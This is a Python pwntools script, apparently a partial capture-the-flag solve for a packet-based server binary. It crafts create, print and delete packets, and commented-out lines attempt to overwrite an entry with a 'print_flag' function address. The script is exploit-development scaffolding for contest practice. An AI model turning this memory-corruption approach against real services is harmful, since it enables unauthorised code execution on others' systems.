#!/usr/bin/env python3


"""
Packet structure:
    clientfd int 4bytes,
    payload ip, int 4bytes
    payload port, int 4 bytes
    timestamp, int 4bytes
    datafeild_1, char[16] coordinate
    datafeild_2, char[8] radiation
"""

from pwn import *
import struct
import time
#from impacket import ImpacketPacket
#from socket import socket, AF_INET, SOCK_RAW, IPPROTO_TCP

exe = ELF("server_binary_patched")

context.binary = exe

deliminator = b'\x0e'
terminator = b"\x0c"
packet_size = 0x2d
print_flag = 0x00400d27

#actions
create_entry = 1
delete_entry = 2
print_entry = 3
end = 5

def create_packet(action, datafeild_1 = b"\x00", datafield_2 = 0, payload_ip=2130706433, payload_port=9001, timestamp=0):
    packet = struct.pack(">I", payload_ip)#p32(payload_ip) #payload_ip
    packet += deliminator
    packet += struct.pack(">H", payload_port)#payload_port
    packet += deliminator
    packet += struct.pack(">I", timestamp)#timestamp
    packet += deliminator
    packet += struct.pack(">H", action)#action
    packet += deliminator
    #log.info(f"length of the packet metadata= {hex(len(packet))}")
    df1 = datafeild_1 + (16 - len(datafeild_1))*b'\x00'
    df2 = struct.pack(">Q", datafield_2)#datafield_2 + (8 - len(datafield_2))*b'\x00'
    for i in range(4):
        packet += df1[i*4:(i+1)*4]
        packet += deliminator
    packet += df2
    packet += deliminator
    packet += terminator
    #log.info(f"length of the packet = {hex(len(packet))}")
    #log.info(f"packet: {packet}")
    return packet

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        #r = remote("localhost", 9999)#, ssl=True)
        r = remote("trellixhax-free-yo-radicals-part-i.chals.io", 443, ssl=True)

    return r

def close(chef=0):
    r = null
    if not chef:
        r = conn()
    else:
        r = chef
    p = create_packet(end)
    r.send(p)
    print(r.recvuntil("Bye bye!"))
    time.sleep(1)
    r.close()

def create(r, df1, df2):
    p1 = create_packet(create_entry, datafeild_1=df1, datafield_2=df2)
    r.send(p1)
    #log.debug(r.recvuntil("Created new radiation value!"))

def printer(r, index=0):
    p2 = create_packet(print_entry, datafield_2=index)
    r.send(p2)
    r.recvuntil("mSv")
    temp = r.recvline()
    log.info(f"mSv{temp.decode('utf-8')}")

def delete(r, radiation):
    p = create_packet(delete_entry, datafield_2=radiation)
    r.send(p)

def main():
    r = conn()

    create(r,b"CHEFCHEFCHEFCHEF", 41)
    #create(r,b"HELPHELPHELPHELP", 42)
    #create(r,b"KISSKISSKISSKISS", 43)
    printer(r)
    #printer(r,index=1)
    delete(r, 42)
    #create(r,p64(4) + p64(print_flag), 868082074056920076)
    #create(r,b"PWN2PWN2PWN2", 868082074056920076)
    #p = create_packet(print_entry, datafield_2=1)
    #r.send(p)
    close(chef=r)
    r.interactive()


if __name__ == "__main__":
    if args.CLOSE:
        close()
    else:
        main()
